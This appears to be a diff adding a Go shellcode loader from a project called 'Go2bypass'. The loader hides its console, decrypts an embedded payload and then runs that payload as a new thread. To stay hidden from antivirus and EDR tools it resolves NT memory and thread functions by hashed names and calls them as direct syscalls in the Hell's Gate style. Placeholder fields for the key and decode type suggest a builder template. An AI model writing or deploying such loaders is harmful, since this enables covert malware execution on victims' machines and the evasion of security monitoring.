@@ -1,0 +1,107 @@
+//good
+package main
+
+import (
+	Go2public "Go2bypass/Public"
+	"fmt"
+	_ "embed"
+	Go2gabh "Go2bypass/Doge-Gabh/Gabh"
+	"os"
+	"syscall"
+	"unsafe"
+)
+
+//go:embed CodeToStringShell.txt
+var CodeToStringShell string
+
+var ApiDe Go2public.ApiEDcrypt
+var CodeEnContent Go2public.CodToshellKey
+
+func main() {
+	/******HideConsole******/
+	Go2public.Peels()
+	CodeEnContent.KeyKey = `/******KeyKey******/`
+	CodeEnContent.CodeToStringShell = CodeToStringShell
+	/******DecodeType******/
+	sc, err := ApiDe.CodeToShellDncrypt(CodeEnContent)
+	if err != nil {
+		os.Exit(0)
+	}
+	var thisThread = uintptr(0xffffffffffffffff)
+	alloc, e := Go2gabh.MemHgate("04262a7943514ab931287729e862ca663d81f515", Go2public.Str2sha1)
+	if e != nil {
+		panic(e)
+	}
+	protect, e := Go2gabh.DiskHgate("a6290493ec0ae72f94b5e4507d63420e40d5e35404d99a583a62acfedddfd848", Go2public.Sha256Hex)
+	if e != nil {
+		panic(e)
+	}
+	createthread, e := Go2gabh.MemHgate("a3b64f7ca1ef6588607eac4add97fd5dfbb9639175d4012038fc50984c035bcd", Go2public.Sha256Hex)
+	if e != nil {
+		panic(e)
+	}
+	pWaitForSingleObject, _, e := Go2gabh.MemFuncPtr("kernel32.dll", "681e778499375c2fb42da094ca5119ae773c189b", Go2public.Str2sha1)
+	if e != nil {
+		panic(e)
+	}
+	createThread(sc, thisThread, alloc, protect, createthread, pWaitForSingleObject)
+}
+
+func createThread(sc []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16, pWaitForSingleObject uint64) {
+
+	const (
+		memCommit  = uintptr(0x00001000)
+		memreserve = uintptr(0x00002000)
+	)
+
+	var baseA uintptr
+	regionsize := uintptr(len(sc))
+	r1, r := Go2gabh.HgSyscall(
+		NtAllocateVirtualMemorySysid,
+		handle,
+		uintptr(unsafe.Pointer(&baseA)),
+		0,
+		uintptr(unsafe.Pointer(&regionsize)),
+		uintptr(memCommit|memreserve),
+		syscall.PAGE_READWRITE,
+	)
+	if r != nil {
+		fmt.Printf("1 %s %x\n", r, r1)
+		return
+	}
+	Go2public.Cpymem(baseA, sc)
+
+	var oldprotect uintptr
+	r1, r = Go2gabh.HgSyscall(
+		NtProtectVirtualMemorySysid,
+		handle,
+		uintptr(unsafe.Pointer(&baseA)),
+		uintptr(unsafe.Pointer(&regionsize)),
+		syscall.PAGE_EXECUTE_READ,
+		uintptr(unsafe.Pointer(&oldprotect)),
+	)
+	if r != nil {
+		fmt.Printf("1 %s %x\n", r, r1)
+		return
+	}
+	var hhosthread uintptr
+	r1, r = Go2gabh.HgSyscall(
+		NtCreateThreadExSysid,
+		uintptr(unsafe.Pointer(&hhosthread)),
+		0x1FFFFF,
+		0,
+		handle,
+		baseA,
+		0,
+		uintptr(0),
+		0,
+		0,
+		0,
+		0,
+	)
+	syscall.Syscall(uintptr(pWaitForSingleObject), 2, handle, 0xffffffff, 0)
+	if r != nil {
+		fmt.Printf("1 %s %x\n", r, r1)
+		return
+	}
+}
